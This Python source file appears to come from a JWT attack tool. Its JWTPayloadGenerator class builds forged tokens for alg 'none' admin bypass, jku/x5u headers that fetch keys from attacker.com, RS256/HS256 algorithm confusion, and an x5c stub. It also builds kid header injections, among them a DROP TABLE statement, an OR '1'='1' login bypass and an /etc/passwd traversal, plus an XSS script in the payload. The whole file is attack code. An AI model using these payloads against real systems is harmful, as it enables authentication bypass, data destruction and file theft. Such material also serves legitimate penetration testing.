# core/payloads.py
import json
import base64
import uuid

class JWTPayloadGenerator:
    def generate_payloads(self, attack_type, template_token=None):
        """Generate attack payloads"""
        
        payloads = []
        
        if attack_type == "none":
            payloads = self._generate_none_attack()
        elif attack_type == "jku_x5u":
            payloads = self._generate_jku_x5u_attack()
        elif attack_type == "alg_confusion":
            payloads = self._generate_alg_confusion_attack()
        elif attack_type == "kid_sql":
            payloads = self._generate_kid_sql_attack()
        elif attack_type == "x5c":
            payloads = self._generate_x5c_attack()
        elif attack_type == "cty":
            payloads = self._generate_cty_attack()
        
        return payloads
    
    def _generate_none_attack(self):
        """Generate tokens with 'none' algorithm"""
        
        header = {"alg": "none", "typ": "JWT"}
        payload = {"sub": "admin", "iat": 1516239022, "exp": 9999999999}
        
        header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
        payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
        
        token = f"{header_encoded.decode()}.{payload_encoded.decode()}."
        
        return [token]
    
    def _generate_jku_x5u_attack(self):
        """Generate tokens with malicious jku/x5u headers"""
        
        payloads = []
        
        # JKU attack
        malicious_jku = "http://attacker.com/jwks.json"
        header = {"alg": "RS256", "typ": "JWT", "jku": malicious_jku}
        payload = {"sub": "admin", "iat": 1516239022}
        
        # X5U attack
        malicious_x5u = "http://attacker.com/cert.pem"
        header2 = {"alg": "RS256", "typ": "JWT", "x5u": malicious_x5u}
        
        for h in [header, header2]:
            token = self._encode_token(h, payload)
            payloads.append(token)
        
        return payloads
    
    def _generate_alg_confusion_attack(self):
        """Generate algorithm confusion attacks"""
        
        payloads = []
        
        # RS256 to HS256 confusion
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {"sub": "admin", "iat": 1516239022}
        
        token = self._encode_token(header, payload)
        payloads.append(f"{token} (Use with public key as secret)")
        
        return payloads
    
    def _generate_kid_sql_attack(self):
        """Generate SQL injection in kid header"""
        
        payloads = []
        
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "../../../../etc/passwd",
            "http://attacker.com/malicious.key"
        ]
        
        for sql in sql_payloads:
            header = {"alg": "HS256", "typ": "JWT", "kid": sql}
            payload = {"sub": "admin", "iat": 1516239022}
            token = self._encode_token(header, payload)
            payloads.append(token)
        
        return payloads
    
    def _generate_x5c_attack(self):
        """Generate x5c header attacks"""
        
        header = {
            "alg": "RS256",
            "typ": "JWT",
            "x5c": ["MALICIOUS_CERT_CHAIN"]
        }
        payload = {"sub": "admin", "iat": 1516239022}
        
        token = self._encode_token(header, payload)
        return [token]
    
    def _generate_cty_attack(self):
        """Generate content type attacks"""
        
        header = {"alg": "HS256", "typ": "JWT", "cty": "text/html"}
        payload = {"sub": "admin", "data": "<script>alert('XSS')</script>"}
        
        token = self._encode_token(header, payload)
        return [token]
    
    def _encode_token(self, header, payload):
        """Helper to encode token"""
        header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
        payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
        return f"{header_encoded.decode()}.{payload_encoded.decode()}.signature"